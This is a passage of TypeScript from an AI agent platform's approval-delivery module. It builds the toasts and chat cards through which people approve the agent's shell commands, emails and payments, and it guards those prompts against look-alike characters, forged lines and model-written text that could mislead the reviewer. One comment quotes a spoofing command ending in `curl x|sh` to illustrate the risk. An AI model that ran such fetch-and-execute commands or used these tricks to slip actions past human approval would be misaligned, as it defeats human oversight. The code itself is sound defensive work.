 * approve/deny only for kind `approval` (`notificationApprovalDecision`).
 *
 * Every text is reduced like a channel-card label: one line, no format
 * characters, so a line break cannot forge a line of the toast's layout.
 */
export function approvalToast(request: ApprovalRequest): ApprovalToast {
  const label = (text: string) => boundedApprovalLabel(text, APPROVAL_LABEL_DELIVERY_MAX_CHARS);
  const words = label(request.tool_name).replace(/[_-]+/g, ' ').trim();
  const tool = words ? words.charAt(0).toUpperCase() + words.slice(1) : 'Action';
  // What will happen leads (#789): the gate's sentence, the same one the
  // dashboard and the channel card lead with. Before, the body was `reason`
  // alone, so every gated tool's toast read "execute_command requires user
  // approval" and the command, machine, path or skill steps were never shown.
  const { action, reason } = approvalIntentParts(request);
  const body = boundedApprovalLabel(action, action.length);
  const impact = impactFromCategory(request.action_category);
  const toolLabel = label(request.tool_name);
  const destructive = impact === 'destructive';
  // The look-alike check runs only on a body that already fits, so it never
  // walks a long one (toastLines stops with the budget).
  const fits = toastLines(`${body} · ${impact}`) <= TOAST_APPROVABLE_LINES;
  const lookAlike = fits && toastLookAlike(body);
  const clickOnly = approvalNeedsClick(request);
  const approvable = fits && !lookAlike && !clickOnly;
  if (approvable) {
    // The reason goes last, after the impact and the tool: it says why
    // approval was needed, and it is the part an OS cut may take.
    return {
      id: request.id, kind: 'approval', title: `Approve: ${tool}?`, body,
      meta: `${impact} · ${toolLabel}${reason ? ` · ${reason}` : ''}`, destructive,
      actions: [{ id: 'deny', label: 'Deny' }, { id: 'approve', label: 'Approve', primary: true }],
      approvable,
    };
  }
  // Leave room for the `...` and the ` · <impact>` that follows the body. A
  // look-alike body already fits, so it is shown whole, with the reason.
  const room = TOAST_APPROVABLE_MAX_COLUMNS - `... · ${impact}`.length;
  return {
    id: request.id, kind: 'approval_review', title: `Review in Jarvis: ${tool}`,
    body: fits ? body : `${fitColumns(body, room).trimEnd()}...`,
    meta: `${impact} · ${toolLabel} · ${clickOnly ? 'requires on-screen review in Jarvis' : lookAlike ? `${LOOK_ALIKE_REASON}, so check it in Jarvis` : 'too long to approve from a notification'}`, destructive,
    actions: [{ id: 'review', label: 'Open Jarvis', primary: true }, { id: 'dismiss', label: 'Dismiss' }],
    approvable,
  };
}

/**
 * What an approval will do, and why it needed approval, as two separate texts.
 *
 * WHAT WILL HAPPEN (`action`) is what the person is deciding on; WHY approval
 * was needed (`reason`) is the Authority engine's decision reason (#721).
 * `request.reason` is that reason on every request but one, and the engine's
 * wording names a category or a rule, never the effect: `Override requires
 * approval for execute_command`, a context rule's own `description`,
 * `send_email is a governed action requiring user approval`. This used to
 * recognise the engine only by two suffixes and the taint label and let any
 * other reason REPLACE the sentence, so an override or a context rule hid the
 * command, the path or the skill's steps entirely: the reviewer saw why
 * approval was needed but not what would happen.
 *
 * The one exception is `request_approval`, whose `reason` IS the model's
 * declared intent (#696): that is the action, reduced to one line with no
 * format characters and not cut, and it has no separate reason. Its `context`
 * is model-written too, so it is never read as a gate sentence
 * (`approvalIntentFromContext`) -- before #721 an intent ending in "requires
 * user approval" made the model's own context JSON the headline.
 *
 * The reason gets the same one-line reduction: a context rule's description is
 * free text from config. The engine's own wording comes back byte-exact.
 *
 * Neither part is cut here. Each surface decides how much it can show, and a
 * surface that cannot show the action whole must not offer to approve it
 * (`approvalChannelCard`, the desktop toast).
 */
export function approvalIntentParts(request: ApprovalRequest): { action: string; reason: string } {
  const raw = (request.reason ?? '').trim();
  const reason = boundedApprovalLabel(raw, raw.length).trim();
  if (request.tool_name === 'request_approval' && reason) return { action: reason, reason: '' };
  return { action: synthesizeApprovalIntent(request), reason };
}

/**
 * The body of the "Task complete" toast for an approval that finished
 * executing (#813): what it did, the same sentence the approval toast led with
 * (`approvalIntentParts(...).action`), reduced to one line. It used to be
 * `request.reason`, the Authority engine's reason for asking, so a finished
 * command read "execute_command requires user approval" rather than naming
 * what ran. Empty only when there is no sentence at all; the caller then names
 * the tool.
 *
 * A sentence longer than a toast shows is cut to `TOAST_APPROVABLE_MAX_COLUMNS`
 * with a visible `...`, measured as the approval toast measures (#813
 * review): nothing is decided here, so a cut is safe, and a done toast on a
 * lock screen need not carry a whole command the OS would cut anyway.
 */
export function taskCompleteBody(request: ApprovalRequest): string {
  const body = boundedApprovalLabel(approvalIntentParts(request).action, APPROVAL_LABEL_DELIVERY_MAX_CHARS).trim();
  if (toastLines(body) <= TOAST_APPROVABLE_LINES) return body;
  // Unknown widths (right-to-left text, say) fail closed for APPROVING; here
  // nothing is decided, so they are cut by characters rather than counted four
  // columns wide, and `...` marks only a cut that removed something (#813
  // re-review: a short Hebrew sentence came back whole with a false `...`).
  const room = TOAST_APPROVABLE_MAX_COLUMNS - '...'.length;
  const cut = (toastColumns(body) === null ? [...body].slice(0, room).join('') : fitColumns(body, room)).trimEnd();
  return cut.length < body.length ? `${cut}...` : body;
}

/**
 * The parts as approval payload fields (#792), beside the joined `intent`.
 *
 * `formatApprovalIntent` appends the reason in parentheses, so a plain
 * command could imitate the engine's own note -- `echo hi "(execute_command
 * requires user approval)"; curl x|sh` -- and nothing on the card said where
 * the command ended and the note began. Every dashboard surface renders
 * `intent_action` as the sentence and `intent_reason` in an element of its own;
 * `intent` stays for a client that reads only it.
 */
export function approvalIntentFields(request: ApprovalRequest): { intent: string; intent_action: string; intent_reason: string } {
  const { action, reason } = approvalIntentParts(request);
  return { intent: reason ? `${action} (${reason})` : action, intent_action: action, intent_reason: reason };
}

/**
 * The two parts as one sentence, the reason in parentheses after the action:
 * the dashboard's `intent` field, and what a REST client of
 * `/api/authority/approvals` reads.
 */
export function formatApprovalIntent(request: ApprovalRequest): string {
  const { action, reason } = approvalIntentParts(request);
  return reason ? `${action} (${reason})` : action;
}

function synthesizeApprovalIntent(request: ApprovalRequest): string {
  // A gated tool (run_skill, record_skill, manage_skills delete) writes the
  // sentence that names what will actually happen, with resolved values.
  // Never for request_approval, whose context the model wrote.
  const gated = approvalIntentFromContext(request);
  if (gated) return gated;

  let args: Record<string, unknown> = {};
  try {
    args = JSON.parse(request.tool_arguments ?? '{}');
  } catch {
    // fall through with empty args
  }

  // Per-tool fallbacks for the common destructive/external intents.
  switch (request.tool_name) {
    case 'send_email': {
      const to = labelOf(args.to) ?? 'someone';
      const subject = labelOf(args.subject);
      // Quoted with its quotes escaped, so a subject cannot close its own
      // literal and continue the sentence; a plain subject reads as it did.
      return subject
        ? `Send email to ${to} — ${JSON.stringify(subject)}`
        : `Send email to ${to}`;
    }
    case 'send_message': {
      const channel = labelOf(args.channel) ?? 'channel';
      return `Send message via ${channel}`;
    }
    case 'run_command':
    case 'execute_command': {
      // Only an approval recorded before `run_command` had a gate (#720)
      // reaches this; every new one carries the gate's sentence above. Shown
      // as the gate shows it, never raw: a newline collapsed in HTML let a
      // second line hide behind a `#` comment, and a bidi override reordered
      // the line. A plain one-line command reads exactly as it always did.
      const shown = commandForCard(asString(args.command) ?? '', { trim: false });
      return asString(args.command) === undefined ? 'Run a shell command' : `R${shown.slice(1)}`;
    }
    case 'delete_file':
    case 'delete_data': {
      const path = labelOf(args.path) ?? labelOf(args.target) ?? 'the target';
      return `Delete ${path}`;
    }
    case 'install_software': {
      const pkg = labelOf(args.package) ?? labelOf(args.name) ?? 'software';
      return `Install ${pkg}`;
    }
    case 'make_payment': {
      const amount = labelOf(args.amount) ?? labelOf(args.total);
      const to = labelOf(args.recipient) ?? labelOf(args.to) ?? 'recipient';
      return amount ? `Pay ${amount} to ${to}` : `Make a payment to ${to}`;
    }
    case 'spawn_agent': {
      const role = labelOf(args.role) ?? labelOf(args.specialist) ?? 'an agent';
      return `Spawn ${role}`;
    }
    default: {
      // Governed workflow-piece effects: `piece:<catalog id>/<action>`. The
      // durable effect's target rides along in `context`, so the sentence can
      // name the recipient, file or endpoint rather than just the piece.
      const governedPiece = /^piece:([^/]+)\/(.+)$/u.exec(request.tool_name);
      if (governedPiece) return describeGovernedPieceIntent(governedPiece[1]!, governedPiece[2]!, request);
      const verb = request.tool_name.replace(/_/g, ' ');
      return `${verb}`.replace(/^./, (c) => c.toUpperCase());
    }
  }
}

/** A governed piece's target value in the dashboard sentence: the 80 it always had. */
const GOVERNED_TARGET_VALUE_MAX_CHARS = 80;

/**
 * "Gmail - send email to finance@example.test, subject: Q3 invoice".
 *
 * Reads the reviewed target out of the approval's context, which is what the
 * piece adapter resolved from the step's real input. A card that said only
 * "gmail" would not be governance.
 */
function describeGovernedPieceIntent(pieceId: string, action: string, request: ApprovalRequest): string {
  const label = pieceId.replace(/-/g, ' ').replace(/^./, c => c.toUpperCase());
  const verb = action.replace(new RegExp(`^${pieceId.replace(/-/g, '_')}_`, 'u'), '').replace(/[_-]/g, ' ');
  let target: Record<string, unknown> = {};
  try {
    const context: unknown = JSON.parse(request.context ?? '{}');
    if (context && typeof context === 'object' && !Array.isArray(context)) {
      const raw = (context as Record<string, unknown>).target;
      if (raw && typeof raw === 'object' && !Array.isArray(raw)) target = raw as Record<string, unknown>;
    }
  } catch {
    // No context to read; the piece and action alone still describe the step.
  }
  const details: string[] = [];
  for (const [key, value] of Object.entries(target)) {
    if (key === 'piece' || key === 'action' || key === 'unmappedAction') continue;
    const rendered = Array.isArray(value) ? value.map(item => String(item)).join(', ')
      : value === null || typeof value === 'object' ? undefined : String(value);
    if (!rendered) continue;
    // The step's real input, which a flow can wire from anything it read, so
    // one line with no format characters before the 80-character cut (#697):
    // the same reduction #651 gave the Telegram card's labels.
    const shown = boundedApprovalLabel(rendered, GOVERNED_TARGET_VALUE_MAX_CHARS) || '(invisible characters only)';
    details.push(`${key.replace(/_/g, ' ')}: ${shown}`);
    if (details.length === 3) break;
  }
  const head = `${label} - ${verb}`;
  return details.length > 0 ? `${head} (${details.join(', ')})` : head;
}

function asString(v: unknown): string | undefined {
  return typeof v === 'string' && v.length > 0 ? v : undefined;
}

/**
 * A model-supplied argument in a fallback sentence: one line with no format
 * characters, not cut (#721 review). Since #721 these sentences lead the card
 * whenever the engine's reason is an override or a context rule, where before
 * the reason replaced them, so they get the reduction the headline gets. A
 * value that reduces to nothing falls back like a missing one.
 */
function labelOf(v: unknown): string | undefined {
  const s = asString(v);
  return s === undefined ? undefined : boundedApprovalLabel(s, s.length).trim() || undefined;
}


/** A label as the channel card shows it, and whether showing it cut anything. */
function cardLine(text: string): { shown: string; cut: boolean } {
  const shown = boundedApprovalLabel(text, APPROVAL_LABEL_DELIVERY_MAX_CHARS);
  return { shown, cut: shown !== boundedApprovalLabel(text, text.length) };
}

/**
 * The Telegram/Discord approval card (#718), and whether it may be approved by
 * replying to it.
 *
 * It leads with what will happen -- the gate's sentence, the same one the
 * dashboard leads with -- on its own `Intent:` line. Before #718 it carried
 * only `Action:`, `Agent:` and `Reason:`, so a `site_run_command` was approved
 * from a chat without the command ever being shown. The reason keeps its own
 * `Reason:` line rather than following the sentence in parentheses, so a
 * command cannot imitate it.
 *
 * Every line is reduced like any label: one line, no format characters, the
 * delivery backstop. A line the backstop CUT is not shown whole, and a card
 * longer than one message (`CHANNEL_CARD_APPROVABLE_MAX_CHARS`) is not shown
 * as one piece, so either card then offers only `deny` and sends the person
 * to the dashboard to approve;
 * `approvable` is what the channel reply handler (`channelApprovalReply`)
 * checks before it acts on an `approve`, and `refusal` says why it is false.
 * Denying something you could not read whole is always safe.
 *
 * An Intent line that could be a look-alike (`toastLookAlike`: `pаypal.com`
 * with a Cyrillic `а`, `paypal．com`, `pạypal.com`) withholds approval too
 * (#857), the check the desktop toast runs on its body (#812, #858). In a chat
 * the whole card is text, with no hover and no URL bar, so a look-alike is read
 * as the name it imitates. The card is shown whole, with that reason. Only the
 * Intent line is checked, as only the toast body is: it is what is approved.
 * The tool name is a registered id, the reason is the engine's wording or the
 * owner's own rule, and an agent name needs no look-alike to claim anything
 * (a workflow can simply be called "Jarvis"). Checking them would make every
 * workflow named in Cyrillic, beside its ASCII run id, deny-only from chat.
 *
 * The cost carries over from the toast, and chat is where people who do not
 * write English approve. Each of these is deny-only from chat and has to be
 * approved on the dashboard:
 * - a word that puts a Turkish `ı`, a French `æ`/`œ` or `þ` beside ASCII
 *   letters (`Dosyayı`, `cœur`);
 * - a word, or a run of words, in another script made only of letters that
 *   read as ASCII among ASCII text (`Fly to Куба`, a reply `Ага, хорошо`);
 * - a word of 4 or more such letters, or a 3-letter acronym, anywhere in an
 *   intent with ASCII or digits (R5): `сахар`, `гора`, `Горох и сахар: 2 кг`,
 *   a name such as `Саша` in English (`Send to Саша`), an acronym such as
 *   `МТС` (`Pay 300 RUB to МТС`). The legal forms ООО, ОАО, ЗАО, АО, ТОО and
 *   ИП are exempt (`ООО Ромашка`);
 * - a Vietnamese, Romanian, Polish or Turkish domain, address or path with a
 *   mark below (`markBelowInAddress`), or a Hausa, Maltese, Sami, Icelandic or
 *   Faroese one with a hooked or barred letter (`ɓ`, `ħ`, `ŧ`, `ð`,
 *   `hookLetterInAddress`).
 * Because the check runs per label, an intent that mixes scripts word by word
 * (`Send email to Дмитрий`, a Russian subject line, `ファイル /tmp/x を削除`)
 * stays approvable.
 *
 * The card is sent as literal text (`{ literal: true }`): Telegram's Markdown
 * and Discord's markdown would otherwise render a label's own `[text](url)`,
 * `||spoiler||`, `*`/`_` pairs or mentions, which can hide or drop part of
 * what is being approved.
 */
export function approvalChannelCard(request: ApprovalRequest): { text: string; approvable: boolean; refusal: ChannelCardRefusal | null } {
  const shortId = request.id.slice(0, APPROVAL_SHORT_ID_LENGTH);
  const { action, reason } = approvalIntentParts(request);
  const intent = cardLine(action);
  const tool = cardLine(request.tool_name);
  const agent = cardLine(request.agent_name);
  const why = cardLine(reason);
  const head = [
    `[APPROVAL NEEDED]`,
    `Intent: ${intent.shown}`,
    `Action: ${tool.shown} (${request.action_category})`,
    `Agent: ${agent.shown}`,
    ...(why.shown ? [`Reason: ${why.shown}`] : []),
    ``,
  ];
  const approvableText = [...head, `Reply with:`, `  approve ${shortId}`, `  deny ${shortId}`].join('\n');
  // Whole on every line AND one message on every channel: a card split over
  // several messages can interleave with another card sent at the same time,
  // so one card's tail -- its `approve` line included -- would sit under
  // another card's head (#718 review).
  const whole = ![intent, tool, agent, why].some((line) => line.cut)
    && approvableText.length <= CHANNEL_CARD_APPROVABLE_MAX_CHARS;
  // Checked only on a card shown whole, like the toast, so it never walks a
  // label the backstop cut.
  const refusal: ChannelCardRefusal | null = !whole ? 'too_long' : toastLookAlike(intent.shown) ? 'look_alike' : null;
  if (refusal === null) return { approvable: true, refusal, text: approvableText };
  return {
    approvable: false,
    refusal,
    text: [
      ...head,
      refusal === 'too_long'
        ? `This is too long to show whole in one message here, so it cannot be approved from this chat.`
        : `The intent ${LOOK_ALIKE_REASON}, so it cannot be approved from this chat.`,
      refusal === 'too_long'
        ? `Open the Jarvis dashboard to read all of it and decide, or reply:`
        : `Open the Jarvis dashboard to check it and decide, or reply:`,
      `  deny ${shortId}`,
    ].join('\n'),
  };
}

/** Why a chat approval card offers only `deny`: a line or the card would be cut, or the intent could be a look-alike. */
export type ChannelCardRefusal = 'too_long' | 'look_alike';

/**
 * The longest approval card that can be approved by reply: one that every
 * channel delivers as ONE message. Discord's limit is 2000 characters and the
 * literal escape at most doubles the text (`discordLiteral`, pinned by its
 * test), so 1000 raw characters always fit; Telegram's 4096 is larger.
 * Derived, not chosen: raising it lets a card span two Discord messages.
 */
export const CHANNEL_CARD_APPROVABLE_MAX_CHARS = 1000;

export type ApprovalBroadcaster = {
  broadcastApprovalRequest(request: ApprovalRequest): void;
};

export type ChannelSender = {
  /** `delivery.approvalCard`: the one send path allowed a retry after a timeout or drop (owner decision, Q-19). */
  broadcastToAll(text: string, options?: SendOptions, delivery?: { approvalCard?: boolean }): Promise<void>;
};

export class ApprovalDelivery {
  private broadcaster: ApprovalBroadcaster | null = null;
  private channelSender: ChannelSender | null = null;

  setBroadcaster(broadcaster: ApprovalBroadcaster): void {
    this.broadcaster = broadcaster;
  }

  setChannelSender(sender: ChannelSender): void {
    this.channelSender = sender;
  }

  /**
   * Deliver an approval request to all appropriate channels.
   */
  async deliver(request: ApprovalRequest): Promise<void> {
    // Always push to dashboard via WebSocket
    this.broadcaster?.broadcastApprovalRequest(request);

    // Always push to Telegram/Discord so users can approve/deny directly
    // from messaging channels without opening the dashboard.
    if (this.channelSender) {
      try {
        const card = approvalChannelCard(request);
        await this.channelSender.broadcastToAll(card.text, { literal: true }, { approvalCard: true });
      } catch (err) {
        console.error('[ApprovalDelivery] Failed to send to external channels:', err);
      }
    }
  }
}
